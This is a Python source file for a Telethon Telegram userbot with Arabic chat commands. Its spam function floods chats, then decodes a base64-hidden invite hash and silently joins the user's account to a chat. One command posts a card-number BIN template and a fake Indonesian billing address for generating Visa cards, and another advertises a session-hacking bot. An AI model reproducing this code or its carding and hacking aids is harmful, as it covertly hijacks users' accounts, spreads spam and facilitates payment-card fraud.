from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from collections import deque
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl import functions
import time
import asyncio
import logging
import base64
import datetime
from payment import *
from help import *
from config import *
from checktele import *

# -

fifthon.start()

y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy}"
sec = time.time()

LOGS = logging.getLogger(__name__)

DEVS = [
    5307018300,
]
DEL_TIME_OUT = 10
normzltext = "1234567890"
namerzfont = normzltext
name = "Profile Photos"
time_name = ["off"]
time_bio = ["off"]


async def join_channel():
    try:
        await fifthon(JoinChannelRequest("@fifthon"))
    except BaseException:
        pass


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"هممم"))
async def _(event):
    if not event.is_reply:
        return await event.edit(
            "يستعمل الامر بالرد على الصورتهة او الفيديو !"
        )
    rr9r7 = await event.get_reply_message()
    await event.delete()
    pic = await rr9r7.download_media()
    await fifthon.send_file(
        "me", pic, caption=f"تم حفظ الصورة او الفيديو الذاتي هنا : "
    )


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
          pass



@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    await event.edit(commands)

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
●▬▬▬▬๑۩۩๑▬▬▬▬▬●
★ 𝙒𝙀𝙡𝘾𝙊𝙈𝙀 𝙏𝙊 𝙎𝙊𝙐𝙍𝘾𝙀 𝙄𝙍𝘼𝙌𝙄
┬┴┬┴┤( ͡° ͜ʖ├┬┴┬┴
★ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : 1.3
★ 𝙋𝙄𝙉𝙂 : `{ms}`
★ 𝘿𝘼𝙏𝙀 : `{m9zpi}`
★ 𝙄𝘿 : `{event.sender_id}`
★ 𝙎𝙊𝙐𝙍𝘾𝙀 𝙄𝙍𝘼𝙌𝙄 : @F_3_3
●▬▬▬▬๑۩۩๑▬▬▬▬▬●

''')

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.خاصيه"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
لفك خاصية 
@CC888 🔱
@X_0_6 🔱
@I_l_I 🔱
@P_H_R 🔱
@z_e_1 🔱
@F_3_3 🔱
@G_5_G 🔱

''')

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.مطور"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''

𝙏𝙀𝙇𝙀 : @F_3_3
𝙄𝙉𝙎𝙏𝘼 : 𝙄𝙎𝙄𝙍𝘼𝙌I
 ❦ ════ •⊰❂⊱• ════ ❦
𝙉𝘼𝙈𝙀 : 𝘼𝙇𝙄
𝘼𝙂𝙀 : 16
𝙇𝙄𝙑𝙀 : 𝙄𝙍𝘼𝙌   
𝙨𝙩𝙪𝙙𝙚𝙣𝙩    
࿇ ══━━━✥◈✥━━━══ ࿇

''')

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.سوبر"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
𝙏𝙃𝙀 𝙆𝙄𝙉𝙂 𝙎𝙐𝙋𝙀𝙍 𝙄𝙉 𝙏𝙀𝙇𝙀 ❂
࿇ ══━━━━✥◈✥━━━══ ࿇
- https://t.me/+Au-9YeWYgRA2N2Zi
- https://t.me/+_aSr4lSZ8xw5YzMy
- https://t.me/+ZVM0-mWOTfAzMWU0
- https://t.me/+yFWxxT8hBIk4ZTlh
- https://t.me/xjgjxgk
- https://t.me/+3Ps0PTWcKnVkYTYx
- https://t.me/+jJPr8Scd-XtkYWUy
- https://t.me/tttffttt
- https://t.me/+Z-C6TvKIMDJmZGJi
- https://t.me/+5HDPPdgJyeU4OGFi
- https://t.me/ss_iid
- https://t.me/+tzEVV5iaHWY5Yjgy
━━━━━━༺༻━━━━━━━

''')

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.فيزا"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
𝙑𝙄𝙎𝘼 𝙃𝙀𝙍𝙆𝙊𝙐
══════◄••❀••►══════
سوي كروب وارفع بوت مشرف (@SDBB_Bot) 
امر استخراج
/gen 547292000038****|11|2027|
┍──━──━──┙◆┕──━──━──┑
دولة اندونيسا

 Address  : Jawa Tenga
Street: Jl Raya Kedung Mundu 3, Jawa Tengah
 
City: Jawa Tengah
 
State : Semarang
 
Zip code: 50181
 
Country Indonesia

وهاذي المعلومات تبعها

''')

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.حبشكلات"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''

@TempMailBot انشاء بريد وهمي
@SESSIONHACKABOT تهكير ترمكس 

''')

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec1)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec2)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec3)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م4"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec4)

    
ownerhson_id = 5436645626
@fifthon.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('my owner iraqi 🔱 @F_3_3')


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
async def update(event):
    await event.edit("• جارِ اعادة تشغيل السورس ..\n• انتضر 1-2 دقيقة  .")
    await fifthon.disconnect()
    await fifthon.send_message("me", "`اكتملت اعادة تشغيل السورس !`")


print("- fifthon Userbot Running ..")
fifthon.run_until_disconnected()
